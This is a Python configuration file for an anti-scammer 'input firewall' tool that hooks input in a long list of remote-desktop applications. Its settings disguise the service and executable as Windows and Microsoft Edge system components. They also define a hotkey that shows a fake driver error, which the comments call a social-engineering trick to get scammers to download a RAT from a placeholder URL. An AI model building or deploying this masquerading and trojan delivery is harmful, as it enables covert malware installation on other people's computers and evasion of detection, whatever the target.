"""
Configuration for Blackhole Input Firewall Service
"""

# ============================================================================
# SERVICE CONFIGURATION
# ============================================================================

# Service name for Task Scheduler (disguised as Windows system task)
SERVICE_NAME = "MicrosoftEdgeUpdateTaskMachineCore"

# Executable name (disguised as legitimate Windows process)
EXE_NAME = "taskhostw.exe"

# Default state on startup (True = firewall ON, block remote input)
DEFAULT_FIREWALL_STATE = True

# ============================================================================
# API HOOKING CONFIGURATION
# ============================================================================

# Magic tag value used to mark input from hooked remote desktop processes
# This value is written to dwExtraInfo field of INPUT structures
MAGIC_TAG = 0xDEADBEEF

# Target processes to hook (remote desktop applications)
# The service will automatically detect and hook SendInput() in these processes
TARGET_PROCESSES = [
    # Common scammer tools
    "AnyDesk.exe",
    "TeamViewer.exe",
    "ammyy.exe",  # Ammyy Admin (very popular with scammers)
    "SupRemo.exe",  # SupRemo
    "UltraViewer.exe",  # UltraViewer
    "ZohoMeeting.exe",  # Zoho Assist
    "ZohoAssist.exe",  # Zoho Assist (alternate)
    # Enterprise/commercial tools
    "RemotePC.exe",
    "LogMeIn.exe",
    "GoToMyPC.exe",
    "Splashtop.exe",
    "bomgar-scc.exe",  # BeyondTrust (formerly Bomgar)
    "vncviewer.exe",  # VNC variants
    "tvnserver.exe",  # TightVNC Server
    "winvnc.exe",  # RealVNC
    "vncserver.exe",  # Generic VNC
    "uvnc_server.exe",  # UltraVNC
    # Open source / newer tools
    "rustdesk.exe",  # RustDesk
    "dwagent.exe",  # DWAgent
    "RemoteUtilities.exe",  # Remote Utilities
    "radmin.exe",  # Radmin
    "Viewer.exe",  # Remote Utilities Viewer
    # Web-based clients
    "remotedesktop.exe",  # Chrome Remote Desktop
    "Chrome Remote Desktop.exe",  # Chrome Remote Desktop (alternate)
    # Windows built-in (if needed)
    "mstsc.exe",  # Windows RDP client
    "msra.exe",  # Windows Remote Assistance
]

# ============================================================================
# PROCESS MONITOR CONFIGURATION
# ============================================================================

# How often to scan for target processes (seconds)
PROCESS_SCAN_INTERVAL = 2.0

# ============================================================================
# HOTKEY CONFIGURATION
# ============================================================================

# Hotkey to toggle firewall on/off (Windows+Shift+F)
# Format: pynput hotkey string format
# Note: <cmd> is the Windows key on Windows, Command key on Mac
TOGGLE_HOTKEY = "<cmd>+<shift>+f"

# Hotkey to trigger fake driver error (Windows+Shift+G)
# This is a social engineering trick to get scammers to download the RAT
DRIVER_ERROR_HOTKEY = "<cmd>+<shift>+g"

# URL where the "driver" (RAT payload) is hosted
DRIVER_DOWNLOAD_URL = "https://your-domain.com/drivers/remote-desktop-driver.exe"
